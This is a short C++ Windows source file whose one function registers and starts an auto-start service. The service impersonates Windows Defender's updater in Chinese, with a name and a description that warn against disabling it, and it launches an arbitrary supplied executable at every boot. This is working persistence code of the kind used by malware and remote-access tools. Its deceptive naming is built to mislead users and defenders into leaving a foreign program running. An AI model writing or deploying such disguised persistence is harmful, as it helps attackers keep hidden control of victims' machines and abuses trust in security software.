#include "SystemService.h"
#include <shlwapi.h>
#pragma comment(lib,"Shlwapi.lib")


BOOL RegisterSystemService(WCHAR lpszDriverPath[]) {

	WCHAR pszServiceName[MAX_PATH] = L"Windows Defender自动更新";
	WCHAR pszServiceDesc[MAX_PATH] = L"使你的Windows Defender保持最新状态。如果此服务已禁用或停止，则Windows Defender将无法保持最新状态，这意味这无法修复可能产生的安全漏洞，并且功能也可能无法使用。";

	// 为路径加上引号，因为CreateService中的lpBinaryPathName要求带引号，除非路径中没空格
	WCHAR lpBinaryPathName[MAX_PATH + 2];
	wsprintf(lpBinaryPathName, L"\"%s\"", lpszDriverPath);

	SC_HANDLE shOSCM = NULL, shCS = NULL;
	SERVICE_STATUS ss;
	DWORD dwErrorCode = 0;
	BOOL bSuccess = FALSE;
	// 打开服务控制管理器数据库
	shOSCM = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (!shOSCM) {
		return FALSE;
	}

	// 创建服务，设置开机自启
	shCS = CreateService(shOSCM, pszServiceName, pszServiceName,
		SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS | SERVICE_INTERACTIVE_PROCESS,
		SERVICE_AUTO_START,	SERVICE_ERROR_NORMAL, lpBinaryPathName, NULL, NULL, NULL, NULL, NULL);
	if (!shCS){
		return FALSE;
	}

	// 设置服务的描述
	SERVICE_DESCRIPTION ServiceDesc;
	ServiceDesc.lpDescription = pszServiceDesc;
	ChangeServiceConfig2(shCS, SERVICE_CONFIG_DESCRIPTION, &ServiceDesc);

	if (!StartService(shCS, 0, NULL))	{
		return FALSE;
	}

	if (shCS) {
		CloseServiceHandle(shCS);
		shCS = NULL;
	}
	if (shOSCM)	{
		CloseServiceHandle(shOSCM);
		shOSCM = NULL;
	}
	return TRUE;
}